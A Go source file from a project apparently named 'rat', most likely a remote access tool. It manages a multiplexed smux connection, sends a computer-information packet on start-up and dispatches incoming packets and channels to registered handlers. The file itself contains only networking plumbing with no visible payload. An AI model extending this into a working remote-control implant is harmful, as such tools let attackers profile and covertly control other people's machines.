package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"rat/shared"
	"rat/shared/network/header"
	"sync"

	"github.com/xtaci/smux"
)

type Connection struct {
	Conn    *smux.Session
	control *smux.Stream

	packets chan Outgoing
	die     chan struct{}
	dieLock sync.Mutex
}

func NewConnection(Conn *smux.Session) (*Connection, error) {
	control, err := Conn.AcceptStream()

	if err != nil {
		return nil, err
	}

	c := &Connection{}
	c.Conn = Conn
	c.control = control
	c.packets = make(chan Outgoing)
	c.die = make(chan struct{})

	return c, nil
}

func (c *Connection) Init() {
	c.packets <- &ComputerInfoPacket{}
}

func (c *Connection) Close(err error) {
	c.dieLock.Lock()
	defer c.dieLock.Unlock()

	select {
	case <-c.die:
	default:
		close(c.die)
		c.Conn.Close()
		fmt.Println("lost connection", err)
	}
}

func (c *Connection) writeLoop() {
	var err error
	for err == nil {
		select {
		case <-c.die:
			return
		case p := <-c.packets:
			err = binary.Write(c.control, shared.ByteOrder, p.Header())
			if err != nil {
				break
			}

			err = p.Write(c.control, c)
			if err != nil {
				break
			}
		}
	}

	c.Close(err)
}

func (c *Connection) recvLoop() {
	var err error
	for {
		var h header.PacketHeader
		binary.Read(c.control, shared.ByteOrder, &h)

		var channel bool
		err = binary.Read(c.control, shared.ByteOrder, &channel)
		if err != nil {
			break
		}

		if channel {
			channel, is := handlerMap[h].(Channel)
			if !is {
				err = errors.New("invalid channel header " + string(h))
				break
			}

			stream, _ := c.Conn.AcceptStream()
			go func() {
				err := channel.Open(stream, c)
				select {
				case <-c.die:
				default:
					if err != nil {
						c.Close(err)
					}
				}
			}()
		} else {
			packet, is := handlerMap[h].(Incoming)
			if !is {
				err = errors.New("invalid packet header " + string(h))
				break
			}

			err = packet.Read(c.control, c)
		}

		if err != nil {
			break
		}
	}

	select {
	case <-c.die:
	default:
		c.Close(err)
	}
}
